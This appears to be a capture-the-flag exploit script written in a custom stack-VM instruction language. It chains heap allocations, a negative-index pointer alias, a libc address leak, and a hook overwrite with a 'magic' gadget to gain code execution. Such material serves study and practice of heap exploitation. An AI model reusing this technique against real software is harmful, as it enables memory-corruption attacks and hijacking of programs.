# allocate & free a large chunk to get libc address
# allocate other chunks for convenience
PUSH 10;
PUSH 10;
PUSH 7;
PUSH 2;
MUL;
MUL;
MUL;
ALLOC;
PUSH 8;
PUSH 8;
MUL;
ALLOC;
PUSH 8;
PUSH 8;
MUL;
ALLOC;
PUSH 8;
PUSH 8;
MUL;
ALLOC;
PUSH 8;
PUSH 8;
MUL;
ALLOC;
PUSH 8;
PUSH 8;
MUL;
ALLOC;
PUSH 8;
PUSH 8;
MUL;
ALLOC;
PUSH 8;
PUSH 8;
MUL;
ALLOC;
PUSH 8;
PUSH 8;
MUL;
ALLOC;
PUSH 8;
PUSH 8;
MUL;
ALLOC;
PUSH 0;
FREE;

ADD;
ADD;

# -1 * 8 * 8 * 10 = -640
PUSH 1;
PUSH 0;
SUB;
PUSH 8;
PUSH 8;
PUSH 10;
MUL;
MUL;
MUL;
ADD; # GPTR[9] == GPTR[3]->buf

POP; # make stack pointer point to &GPTR[8]
PRINT; # leak GPTR[8]

PUSH 3;
RDSTRI; # write p64(8), p64(GPTR[8] - 0x6b0)
PUSH 9;
PRSTRI; # leak base+0x3ebca0
PUSH 3;
RDSTRI; # write p64(8), p64(hook)
PUSH 9;
RDSTRI; # magic
PUSH 2;
FREE;
